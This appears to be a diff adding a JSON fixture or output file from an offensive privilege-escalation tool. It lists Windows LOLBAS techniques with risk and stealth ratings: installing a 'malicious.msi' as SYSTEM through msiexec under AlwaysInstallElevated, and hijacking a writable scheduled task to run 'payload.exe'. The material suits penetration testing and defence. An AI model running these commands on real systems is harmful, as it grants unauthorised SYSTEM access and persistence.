@@ -1,0 +1,34 @@
+{
+    "results": [
+        {
+            "source": "LOLBAS",
+            "technique_id": "lolbas:msiexec:elevated",
+            "description": "Use msiexec to install MSI as SYSTEM when AlwaysInstallElevated is enabled",
+            "command": "msiexec /quiet /qn /i C:\\Temp\\malicious.msi",
+            "requirements": [
+                "AlwaysInstallElevated registry key"
+            ],
+            "risk": "medium",
+            "stealth": "medium"
+        },
+        {
+            "source": "LOLBAS",
+            "technique_id": "lolbas:schtasks:persist",
+            "description": "Modify writable scheduled task to execute payload as SYSTEM",
+            "command": "schtasks /change /tn \"\\Microsoft\\Windows\\Backup\\BackupScript\" /tr \"C:\\Temp\\payload.exe\"",
+            "requirements": [
+                "Writable scheduled task"
+            ],
+            "risk": "medium",
+            "stealth": "low"
+        }
+    ],
+    "query_context": {
+        "target_os": "windows",
+        "privilege_level": "user",
+        "failed_techniques": [
+            "uac_bypass",
+            "potato_attack"
+        ]
+    }
+}
